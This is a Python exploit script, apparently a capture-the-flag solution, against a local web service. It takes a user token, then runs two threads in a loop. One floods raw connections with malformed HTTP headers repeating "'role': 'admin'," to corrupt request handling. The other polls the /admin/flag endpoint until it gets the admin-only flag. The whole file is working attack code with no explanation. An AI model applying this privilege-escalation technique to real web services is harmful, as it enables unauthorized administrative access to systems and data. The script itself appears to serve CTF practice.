import requests
from threading import Thread
from time import sleep
from pwnlib.tubes.remote import remote

resp = requests.get("http://localhost:8000/token")
print(resp.text)
user_token = resp.text

def request_flag():
    headers = {'Authorization': "Bearer "+user_token}
    resp = requests.get("http://localhost:8000/admin/flag", headers=headers)
    if "404" not in resp.text:
        print(resp.text)
        exit(0)

def header_breaker():
    with remote("localhost", 8000) as r:
        r.sendline(b"GET / HTTP/1.0")
        for _ in range(100):
            r.sendline(b"'role': 'admin',"*6)
        r.sendline(b"")
        r.sendline(b"")

def loop_flag():
    while True:
        try:
            request_flag()
            sleep(0.1)
        except Exception:
            pass

def loop_header():
    while True:
        try:
            header_breaker()
            sleep(0.91)
        except Exception as e:
            print(e)
            sleep(1)
            pass
#exit(0)

t = Thread(target=loop_flag)
t.start()
t2 = Thread(target=loop_header)
t2.start()

input("Waiting for input and then quitting!\n")

exit(0)